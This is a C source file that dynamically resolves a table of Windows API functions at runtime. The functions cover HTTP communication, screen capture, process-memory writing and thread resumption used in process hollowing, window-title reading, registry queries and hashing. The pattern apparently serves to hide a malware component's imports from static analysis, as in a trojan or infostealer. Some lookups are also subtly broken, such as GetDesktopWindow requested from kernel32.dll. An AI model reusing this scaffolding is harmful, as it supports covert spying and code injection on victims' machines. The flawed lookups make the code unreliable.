#include "dynamic_linking.h"
#include <stdio.h>

// Global instance of dynamic functions
DynamicFunctions g_DynFuncs = {0};

// Helper function to load a DLL and get a function pointer safely
static void* GetFunctionPointer(const char *dllName, const char *functionName) {
    HMODULE hModule = GetModuleHandleA(dllName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(dllName);
        if (hModule == NULL) {
            return NULL;
        }
    }
    return (void*)GetProcAddress(hModule, functionName);
}

// Initialize all dynamic function pointers
BOOL InitializeDynamicFunctions(void) {
    // Load WININET functions
    g_DynFuncs.pInternetOpenA = (PFN_InternetOpenA)GetFunctionPointer("wininet.dll", "InternetOpenA");
    g_DynFuncs.pInternetConnectA = (PFN_InternetConnectA)GetFunctionPointer("wininet.dll", "InternetConnectA");
    g_DynFuncs.pHttpOpenRequestA = (PFN_HttpOpenRequestA)GetFunctionPointer("wininet.dll", "HttpOpenRequestA");
    g_DynFuncs.pHttpSendRequestA = (PFN_HttpSendRequestA)GetFunctionPointer("wininet.dll", "HttpSendRequestA");
    g_DynFuncs.pInternetReadFile = (PFN_InternetReadFile)GetFunctionPointer("wininet.dll", "InternetReadFile");
    g_DynFuncs.pInternetCloseHandle = (PFN_InternetCloseHandle)GetFunctionPointer("wininet.dll", "InternetCloseHandle");

    // Load KERNEL32 graphics/window functions
    g_DynFuncs.pGetDesktopWindow = (PFN_GetDesktopWindow)GetFunctionPointer("kernel32.dll", "GetDesktopWindow");
    g_DynFuncs.pGetDC = (PFN_GetDC)GetFunctionPointer("user32.dll", "GetDC");
    g_DynFuncs.pCreateCompatibleDC = (PFN_CreateCompatibleDC)GetFunctionPointer("gdi32.dll", "CreateCompatibleDC");
    g_DynFuncs.pGetDeviceCaps = (PFN_GetDeviceCaps)GetFunctionPointer("gdi32.dll", "GetDeviceCaps");
    g_DynFuncs.pCreateCompatibleBitmap = (PFN_CreateCompatibleBitmap)GetFunctionPointer("gdi32.dll", "CreateCompatibleBitmap");
    g_DynFuncs.pSelectObject = (PFN_SelectObject)GetFunctionPointer("gdi32.dll", "SelectObject");
    g_DynFuncs.pBitBlt = (PFN_BitBlt)GetFunctionPointer("gdi32.dll", "BitBlt");
    g_DynFuncs.pGetObject = (PFN_GetObject)GetFunctionPointer("gdi32.dll", "GetObject");
    g_DynFuncs.pReleaseDC = (PFN_ReleaseDC)GetFunctionPointer("user32.dll", "ReleaseDC");
    g_DynFuncs.pDeleteDC = (PFN_DeleteDC)GetFunctionPointer("gdi32.dll", "DeleteDC");
    g_DynFuncs.pDeleteObject = (PFN_DeleteObject)GetFunctionPointer("gdi32.dll", "DeleteObject");
    g_DynFuncs.pGetDIBits = (PFN_GetDIBits)GetFunctionPointer("gdi32.dll", "GetDIBits");

    // Load KERNEL32 file I/O functions
    g_DynFuncs.pGetFileAttributesA = (PFN_GetFileAttributesA)GetFunctionPointer("kernel32.dll", "GetFileAttributesA");
    g_DynFuncs.pCreateFileA = (PFN_CreateFileA)GetFunctionPointer("kernel32.dll", "CreateFileA");
    g_DynFuncs.pReadFile = (PFN_ReadFile)GetFunctionPointer("kernel32.dll", "ReadFile");
    g_DynFuncs.pCloseHandle = (PFN_CloseHandle)GetFunctionPointer("kernel32.dll", "CloseHandle");

    // Load KERNEL32 process functions
    g_DynFuncs.pCreateProcessA = (PFN_CreateProcessA)GetFunctionPointer("kernel32.dll", "CreateProcessA");
    g_DynFuncs.pReadProcessMemory = (PFN_ReadProcessMemory)GetFunctionPointer("kernel32.dll", "ReadProcessMemory");
    g_DynFuncs.pWriteProcessMemory = (PFN_WriteProcessMemory)GetFunctionPointer("kernel32.dll", "WriteProcessMemory");
    g_DynFuncs.pResumeThread = (PFN_ResumeThread)GetFunctionPointer("kernel32.dll", "ResumeThread");

    // Load KERNEL32/USER32 window/input functions
    g_DynFuncs.pGetWindowTextA = (PFN_GetWindowTextA)GetFunctionPointer("user32.dll", "GetWindowTextA");
    g_DynFuncs.pGetForegroundWindow = (PFN_GetForegroundWindow)GetFunctionPointer("user32.dll", "GetForegroundWindow");
    g_DynFuncs.pGetWindowThreadProcessId = (PFN_GetWindowThreadProcessId)GetFunctionPointer("user32.dll", "GetWindowThreadProcessId");
    g_DynFuncs.pGetStdHandle = (PFN_GetStdHandle)GetFunctionPointer("kernel32.dll", "GetStdHandle");
    g_DynFuncs.pReadConsoleA = (PFN_ReadConsoleA)GetFunctionPointer("kernel32.dll", "ReadConsoleA");

    // Load ADVAPI32 registry functions
    g_DynFuncs.pRegOpenKeyExA = (PFN_RegOpenKeyExA)GetFunctionPointer("advapi32.dll", "RegOpenKeyExA");
    g_DynFuncs.pRegQueryValueExA = (PFN_RegQueryValueExA)GetFunctionPointer("advapi32.dll", "RegQueryValueExA");
    g_DynFuncs.pRegCloseKey = (PFN_RegCloseKey)GetFunctionPointer("advapi32.dll", "RegCloseKey");

    // Load ADVAPI32 crypto functions
    g_DynFuncs.pCryptCreateHash = (PFN_CryptCreateHash)GetFunctionPointer("advapi32.dll", "CryptCreateHash");
    g_DynFuncs.pCryptHashData = (PFN_CryptHashData)GetFunctionPointer("advapi32.dll", "CryptHashData");
    g_DynFuncs.pCryptGetHashParam = (PFN_CryptGetHashParam)GetFunctionPointer("advapi32.dll", "CryptGetHashParam");
    g_DynFuncs.pCryptDestroyHash = (PFN_CryptDestroyHash)GetFunctionPointer("advapi32.dll", "CryptDestroyHash");
    g_DynFuncs.pCryptAcquireContextA = (PFN_CryptAcquireContextA)GetFunctionPointer("advapi32.dll", "CryptAcquireContextA");
    g_DynFuncs.pCryptReleaseContext = (PFN_CryptReleaseContext)GetFunctionPointer("advapi32.dll", "CryptReleaseContext");

    // Load NTDLL functions
    g_DynFuncs.pNtQueryInformationProcess = (PFN_NtQueryInformationProcess)GetFunctionPointer("ntdll.dll", "NtQueryInformationProcess");

    // Check if critical functions were loaded
    if (g_DynFuncs.pInternetOpenA == NULL || 
        g_DynFuncs.pCreateFileA == NULL || 
        g_DynFuncs.pCreateProcessA == NULL) {
        return FALSE;
    }

    return TRUE;
}
